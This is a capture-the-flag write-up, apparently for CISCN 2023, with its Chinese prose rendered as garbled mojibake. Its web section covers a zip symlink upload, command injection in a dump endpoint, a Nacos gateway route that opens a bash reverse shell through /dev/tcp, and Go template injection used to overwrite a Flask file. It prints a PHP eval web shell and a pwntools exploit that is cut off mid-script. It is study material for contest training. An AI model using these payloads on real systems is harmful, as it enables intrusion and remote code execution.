<p><img src="/img/wp/2023/2023ciscn-14.png"></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><p>ä¸Šä¼ åè¿”å›æºç </p>
<p>åªèƒ½ä¸Šä¼ <code>zip</code>æ–‡ä»¶ï¼Œä¸Šä¼ ååœ¨<code>tmp</code>ç›®å½•ä½¿ç”¨<code>unzip -o</code>è§£å‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;;<br><br><span class="hljs-comment">//only this!</span><br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">//æ„é€ ä¸€ä¸ªæŒ‡å‘/var/www/htmlçš„è½¯è¿æ¥<br><span class="hljs-built_in">ln</span> -s /var/www/html poc<br><br>//ä¿ç•™è½¯è¿æ¥å‹ç¼©<br>zip --symlinks test.zip poc<br><br>//åˆ›å»ºè·Ÿç¬¬ä¸€ä¸ªå‹ç¼©åŒ…ä¸­ç›®å½•åŒåçš„ç›®å½•<br><span class="hljs-built_in">mkdir</span> poc<br><br>//æ¥ç€å‘ç›®å½•ä¸­å†™ä¸€ä¸ªshell<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;?php eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt; ./poc/shell.php<br><br>//å‹ç¼©è¿™ä¸ªç›®å½•<br>zip -r test1.zip poc<br></code></pre></td></tr></table></figure>

<p>ä¸Šä¼ ç¬¬ä¸€ä¸ªå‹ç¼©åŒ…åä¼šåœ¨<code>tmp</code>ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªè½¯è¿æ¥åˆ°<code>/var/www/html</code>ï¼Œå½“æˆ‘ä»¬ä¸Šä¼ ç¬¬äºŒä¸ªå‹ç¼©åŒ…æ—¶ï¼Œå› ä¸º<code>poc</code>ç›®å½•å·²ç»è½¯è¿æ¥åˆ°<code>/var/www/html</code>äº†ï¼Œæ‰€ä»¥è§£å‹çš„æ—¶å€™ä¼šæŠŠ<code>shell.php</code>æ”¾åœ¨<code>/var/www/html</code></p>
<p><img src="/img/wp/2023/2023ciscn-15.png"></p>
<h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h2><p>æ ¹æ®é¢˜ç›®æè¿°å¯çŸ¥åˆ†åˆ«æœ‰æŸ¥è¯¢å’Œå¯¼å‡ºçš„åŠŸèƒ½ç‚¹</p>
<p>æ ¹æ®æ‰§è¡Œå‘½ä»¤åçš„è¿”å›å€¼æ¨æµ‹æ‰§è¡Œçš„å‘½ä»¤å¦‚ä¸‹</p>
<p>ä¼ å…¥<code>?db=a&amp;table_2_query=b</code>æ—¶ä¼šæ‰§è¡Œ<code>select * from a.b</code><br>ä¼ å…¥<code>?db=a&amp;table_2_dump=b</code>æ—¶ä¼šæ‰§è¡Œ<code>mysqldump -u root a b &gt; log/xxx.log</code></p>
<p>è¿™é‡Œå› ä¸º<code>a</code>å’Œ<code>b</code>çš„å€¼å¯æ§ï¼Œæ‰€ä»¥ç›¸å½“äºæˆ‘ä»¬å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†</p>
<p>æ–¹æ³•1ï¼š<br>ç›´æ¥ä¼ <code>?db=ctf&amp;table_2_dump=%0a+id+&gt;+log/1+%0</code>ï¼Œç„¶åè®¿é—®<code>log/1</code></p>
<p>æ–¹æ³•2ï¼š<br>å› ä¸º<code>mysqldump</code>åœ¨æ‰¾ä¸åˆ°æˆ‘ä»¬ç»™å‡ºçš„è¡¨çš„æƒ…å†µä¸‹ä¼šæŠ›å‡ºé”™è¯¯ä¿¡æ¯<code>mysqldump: Couldn&#39;t find table: &quot;è¡¨å&quot;</code></p>
<p>åœ¨<code>linux</code>ä¸­å¯ä»¥åˆ©ç”¨<code>2&gt;</code>å°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœè¾“å‡ºåˆ°æ–‡ä»¶ä¸­</p>
<p>ä¼ <code>/?db=ctf&amp;table_2_dump=\&lt;\?\=phpinfo\(\)?\&gt;+2&gt;+log/1.php</code>ï¼Œç„¶åè®¿é—®<code>1.php</code></p>
<p><img src="/img/wp/2023/2023ciscn-16.png"></p>
<p>index.phpæºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;www-data&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black</span> = <span class="hljs-string">&#x27;;`*#^$&amp;|&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$black</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    	<span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$black</span>[<span class="hljs-variable">$i</span>])===<span class="hljs-literal">FALSE</span>))&#123;<br>	    <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>	&#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&#x27;host&#x27;</span>)===<span class="hljs-literal">FALSE</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&#x27;-h&#x27;</span>)===<span class="hljs-literal">FALSE</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$servername</span>;dbname=ctf&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>&#125;<br><span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;use ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1&#x27;</span>;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;db&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$db</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;db&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no db!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$t2q</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from <span class="hljs-subst">$db</span>.<span class="hljs-subst">$t2q</span>&quot;</span>;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$t2q</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$db</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">try</span>&#123;<br>    	<span class="hljs-variable">$stm</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    	<span class="hljs-variable">$res</span> = <span class="hljs-variable">$stm</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>    	<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$res</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>)&#123;<br>    	<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$t2d</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$t2d</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$db</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$randstr</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>());<br>    <span class="hljs-variable">$dump</span>=<span class="hljs-string">&#x27;mariadb-dump &#x27;</span>.<span class="hljs-variable">$db</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$t2d</span>.<span class="hljs-string">&#x27; &gt;./log/&#x27;</span>.<span class="hljs-variable">$randstr</span>.<span class="hljs-string">&#x27;.log&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$dump</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;dump log here: &lt;a href=\&#x27;&#x27;</span>.<span class="hljs-string">&#x27;./log/&#x27;</span>.<span class="hljs-variable">$randstr</span>.<span class="hljs-string">&#x27;.log&#x27;</span>.<span class="hljs-string">&#x27;\&#x27;&gt;here&lt;/a&gt;&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p>nacosæœåŠ¡ï¼ŒCVE-2021-29441æ·»åŠ ä»»æ„ç”¨æˆ·è¿›åå°</p>
<p><img src="/img/wp/2023/2023ciscn-17.png"></p>
<p>åˆ†æ<code>backend-1.0-SNAPSHOT.jar</code></p>
<p>å‘ç°å†…éƒ¨é…ç½®æœåŠ¡æœ‰ä¸ª8888çš„gatewayæœåŠ¡ï¼Œidä¸ºbackcfg</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">nacos:</span><br>      <span class="hljs-attr">discovery:</span><br>        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8888</span><br>      <span class="hljs-attr">config:</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">backcfg</span><br>        <span class="hljs-attr">file-extension:</span> <span class="hljs-string">json</span><br>        <span class="hljs-attr">group:</span> <span class="hljs-string">DEFAULT_GROUP</span><br>        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8888</span><br></code></pre></td></tr></table></figure>

<p>å¯ä»¥é€šè¿‡ä¿®æ”¹Gatewayé…ç½®æ–‡ä»¶åä»£backendserviceæœåŠ¡å®ç°rce</p>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/11493#toc">https://xz.aliyun.com/t/11493#toc</a></p>
<p><img src="/img/wp/2023/2023ciscn-18.png"></p>
<p>åå¼¹shell</p>
<figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;spring&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;cloud&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;gateway&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;routes&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;exam&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;order&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;uri&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;lb://backendservice&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;predicates:&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>                            <span class="hljs-string">&quot;Path=/evil/**&quot;</span><br>                        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;filters&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>                            <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;RewritePath&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;replacement&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/xxxx/xxxx 0&gt;&amp;1&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span><br>                                <span class="hljs-punctuation">&#125;</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">]</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>


<p><img src="/img/wp/2023/2023ciscn-19.png"></p>
<h2 id="go-session"><a href="#go-session" class="headerlink" title="go_session"></a>go_session</h2><p>æºç </p>
<figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> route<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;github.com/flosch/pongo2/v6&quot;</span><br>	<span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>	<span class="hljs-string">&quot;github.com/gorilla/sessions&quot;</span><br>	<span class="hljs-string">&quot;html&quot;</span><br>	<span class="hljs-string">&quot;io&quot;</span><br>	<span class="hljs-string">&quot;net/http&quot;</span><br>	<span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">&quot;SESSION_KEY&quot;</span>)))<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Index</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-literal">nil</span> &#123;<br>		session.Values[<span class="hljs-string">&quot;name&quot;</span>] = <span class="hljs-string">&quot;guest&quot;</span><br>		err = session.Save(c.Request, c.Writer)<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br>	&#125;<br><br>	c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;Hello, guest&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Admin</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] != <span class="hljs-string">&quot;admin&quot;</span> &#123;<br>		http.Error(c.Writer, <span class="hljs-string">&quot;N0&quot;</span>, http.StatusInternalServerError)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	name := c.DefaultQuery(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;ssti&quot;</span>)<br>	xssWaf := html.EscapeString(name)<br>	tpl, err := pongo2.FromString(<span class="hljs-string">&quot;Hello &quot;</span> + xssWaf + <span class="hljs-string">&quot;!&quot;</span>)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		<span class="hljs-built_in">panic</span>(err)<br>	&#125;<br>	out, err := tpl.Execute(pongo2.Context&#123;<span class="hljs-string">&quot;c&quot;</span>: c&#125;)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	c.String(<span class="hljs-number">200</span>, out)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Flask</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-literal">nil</span> &#123;<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>			http.Error(c.Writer, <span class="hljs-string">&quot;N0&quot;</span>, http.StatusInternalServerError)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br>	&#125;<br>	resp, err := http.Get(<span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;guest&quot;</span>))<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	<span class="hljs-keyword">defer</span> resp.Body.Close()<br>	body, _ := io.ReadAll(resp.Body)<br><br>	c.String(<span class="hljs-number">200</span>, <span class="hljs-type">string</span>(body))<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æœ‰ä¸‰ä¸ªè·¯ç”±</p>
<figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/&quot;</span>, route.Index)<br>r.GET(<span class="hljs-string">&quot;/admin&quot;</span>, route.Admin)<br>r.GET(<span class="hljs-string">&quot;/flask&quot;</span>, route.Flask)<br></code></pre></td></tr></table></figure>

<p><code>Index</code>è·¯ç”±æä¾›äº†ä¸€ä¸ªé»˜è®¤çš„sessionï¼Œnameèµ‹å€¼ä¸ºguest<br><code>Admin</code>è·¯ç”±åˆ¤æ–­sessionï¼Œéœ€è¦nameå€¼ä¸ºadminï¼Œå¹¶ä½¿ç”¨EscapeStringè½¬ä¹‰nameï¼Œè€Œä¸”è¿˜ä½¿ç”¨äº†pongo2æ¸²æŸ“ï¼Œå­˜åœ¨sstiæ¼æ´<br><code>Flask</code>è·¯ç”±è®¿é—®å†…éƒ¨5000ç«¯å£çš„flaskæœåŠ¡å¹¶å›æ˜¾é¡µé¢</p>
<p>å› ä¸º<code>SESSION_KEY</code>æ˜¯ä»ç¯å¢ƒå˜é‡è·å–çš„ï¼ŒçŒœæµ‹ä¸ºç©ºï¼Œè¿›è¡Œ<code>session</code>ä¼ªé€ <br>æœ¬åœ°ä¿®æ”¹<code>session.Values[&quot;name&quot;] = &quot;admin&quot;</code>ï¼Œè¿è¡Œæ‹¿åˆ°ä¼ªé€ çš„<code>session</code></p>
<p><img src="/img/wp/2023/2023ciscn-20.png"></p>
<p>è®¿é—®<code>/flask?name=/</code>é€šè¿‡æŠ¥é”™æ‹¿åˆ°<code>flask</code>æºç </p>
<p><img src="/img/wp/2023/2023ciscn-21.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args[<span class="hljs-string">&#x27;name&#x27;</span>]<br>    <span class="hljs-keyword">return</span> name + <span class="hljs-string">&#x27;no ssti&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__== <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;127.0.0.1&quot;</span>,port=<span class="hljs-number">5000</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>


<p>å¯ä»¥çœ‹åˆ°<code>flask</code>å¼€å¯äº†<code>debug</code>æ¨¡å¼ï¼Œ<code>debug</code>æ”»å‡»ç‚¹ä¸€èˆ¬åœ¨<code>ç®—pin</code>æˆ–<code>debugçƒ­åŠ è½½</code><br>ä½†æ˜¯è®¿é—®<code>/console</code>å®ç°rceéœ€è¦æºå¸¦cookieéªŒè¯ï¼Œå› ä¸ºæˆ‘ä»¬æ— æ³•ä¼ é€’cookieï¼Œæ‰€ä»¥åˆ©ç”¨sstiè¯»æ–‡ä»¶ç®—pinårceè¿™æ¡è·¯èµ°ä¸é€š</p>
<p>å¦‚å›¾ï¼Œå½“flaskæ–‡ä»¶çš„å†…å®¹è¢«æ›´æ”¹åï¼Œflaskä¼šè‡ªåŠ¨æ›´æ–°ï¼Œä¹Ÿå°±æ˜¯çƒ­åŠ è½½</p>
<p><img src="/img/wp/2023/2023ciscn-22.png"></p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨sstiå®ç°ä»»æ„æ–‡ä»¶è¯»å†™ï¼Œç„¶åè¦†ç›–server.pyï¼Œå®ç°è‡ªå·±çš„æ¶æ„å†…å®¹</p>
<p>æŸ¥é˜…<a href="https://pkg.go.dev/github.com/flosch/pongo2#section-readme">å®˜æ–¹æ‰‹å†Œ</a>å¯çŸ¥pongo2ä¸Django 1.7æœ‰å…¼å®¹çš„è¯­æ³•å’ŒåŠŸèƒ½é›†</p>
<p>Djangoä¸­çš„includeè¯­æ³•åœ¨pongo2ä¸­ä¹Ÿèƒ½ä½¿ç”¨ï¼Œæ‰€ä»¥å¯ä»¥ç”¨includeå®ç°ä»»æ„æ–‡ä»¶è¯»å–<br><img src="/img/wp/2023/2023ciscn-23.png"></p>
<p>å†™æ–‡ä»¶å¯ä»¥â½¤Gin Contexté‡Œçš„FormFileæ¥è¯»å–è¡¨å•â½‚ä»¶ï¼Œç”¨SaveUploadFileä¸Šä¼ ï¼Œæ³¨æ„éœ€è¦ç”¨GETä¼ å‚</p>
<p><img src="/img/wp/2023/2023ciscn-24.png"></p>
<p><img src="/img/wp/2023/2023ciscn-25.png"></p>
<figure class="highlight golang"><table><tr><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">//è¯»æ–‡ä»¶</span><br>&#123;%include c.Request.Referer()%&#125;<br>&#123;%include c.Request.Host()%&#125;<br><br><span class="hljs-comment">//å†™æ–‡ä»¶</span><br><span class="hljs-comment">//è¿™ä¸‰ä¸ªpayloadå…¶å®å¤§åŒå°å¼‚ï¼Œåªæ˜¯åä¸¤ä¸ªä½¿ç”¨äº†è¿‡æ»¤å™¨ï¼ˆc.HandlerNameçš„å€¼ä¸º main/route.Admin ï¼‰</span><br>&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())&#125;&#125;<br>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;&#123;c.SaveUploadedFile(c.FormFile(form),c.Request.Referer())&#125;&#125;&amp;m=file<br>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;m=file&amp;n=/app/server.py<br></code></pre></td></tr></table></figure>


<p><img src="/img/wp/2023/2023ciscn-26.png"></p>
<p>è¦†ç›–åå°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬è‡ªå®šä¹‰çš„å†…å®¹äº†</p>
<p><img src="/img/wp/2023/2023ciscn-27.png"></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="çƒ§çƒ¤æ‘Šå„¿"><a href="#çƒ§çƒ¤æ‘Šå„¿" class="headerlink" title="çƒ§çƒ¤æ‘Šå„¿"></a>çƒ§çƒ¤æ‘Šå„¿</h2><p>ä¿®æ”¹åç§°å­˜åœ¨æ ˆæº¢å‡ºï¼Œç¨‹åºä¸å­˜åœ¨<code>system</code>å‡½æ•°ï¼Œä½¿ç”¨<code>orw</code>è·å–<code>flag</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./shaokao&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;123.56.251.120&quot;</span>,<span class="hljs-string">&quot;12585&quot;</span>)<br>e=ELF(<span class="hljs-string">&quot;./shaokao&quot;</span>)<br><br>fopen=e.sym[<span class="hljs-string">&#x27;open64&#x27;</span>]<br>read=e.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write=e.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401fae&#x27;)</span><br>rdi=<span class="hljs-number">0x000000000040264f</span> <span class="hljs-comment">#rdi</span><br>rsi=<span class="hljs-number">0x000000000040a67e</span> <span 